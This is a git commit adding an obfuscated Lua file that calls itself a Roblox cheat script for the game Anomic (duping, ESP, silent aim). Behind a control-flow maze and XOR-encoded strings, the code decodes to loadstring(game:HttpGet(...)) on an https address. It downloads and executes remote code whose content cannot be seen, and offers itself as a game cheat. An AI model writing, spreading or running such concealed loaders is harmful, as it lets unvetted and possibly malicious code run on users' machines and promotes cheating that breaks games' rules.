a5b826dcbcd630723db2921d355e6990d882500c
Goldfish390 <gameknight3931@gmail.com>
2025-05-23 08:40:59 -0400

    Add files via upload

---
+++ obfuscated (3).lua
@@ -0,0 +1,60 @@
+-- Anomic Universal script e. duping, esp, silent aim, etc
+
+local j,c,b,l,h,k,_
+h,k={[-2201]=24375,[-13152]=-8763},function(a)
+    return h[a+-31508]
+end
+b=k(18356)
+repeat
+    while true do
+        if b==17626753766742/-2011497634 then
+            j,c,l,_=getfenv(),(string.char),(string.byte),(bit32 .bxor)
+            b=k(29307)
+            break
+        end
+    end
+until b==-4622261913750/-189631258
+local d,g,m
+g,m={[-23034]=29208,[23831]=-27923},function(f)
+    return g[f+27054]
+end
+d=m(-3223)
+repeat
+    while true do
+        if d==-0.00075832141861914136*36822117 then
+            j[(function(e,o)
+                local n=''
+                for i=0,#e-1 do
+                    n=n..c(_(l(e,i+1),l(o,i%#o+1)))
+                end
+                return n
+            end)('&\154U\233\196>\135]\227\208','J\245\52\141\183')](j[(function(e,o)
+                local n=''
+                for i=0,#e-1 do
+                    n=n..c(_(l(e,i+1),l(o,i%#o+1)))
+                end
+                return n
+            end)('J\144@\148','-\241')][(function(e,o)
+                local n=''
+                for i=0,#e-1 do
+                    n=n..c(_(l(e,i+1),l(o,i%#o+1)))
+                end
+                return n
+            end)('v\247\226N\196\243J','>\131\150')](j[(function(e,o)
+                local n=''
+                for i=0,#e-1 do
+                    n=n..c(_(l(e,i+1),l(o,i%#o+1)))
+                end
+                return n
+            end)('J\144@\148','-\241')],(function(e,o)
+                local n=''
+                for i=0,#e-1 do
+                    n=n..c(_(l(e,i+1),l(o,i%#o+1)))
+                end
+                return n
+            end)('\142\234A\214G\243;\240{\237\132\229\164\248\143\240\27\197[\164;\156o\255\180\229\187\209\148','\230\158\53\166\52\201\20\223\v\140\247\145\193\154')))()
+            d=m(-50088)
+            break
+        end
+    end
+until d==-58410539+58439747
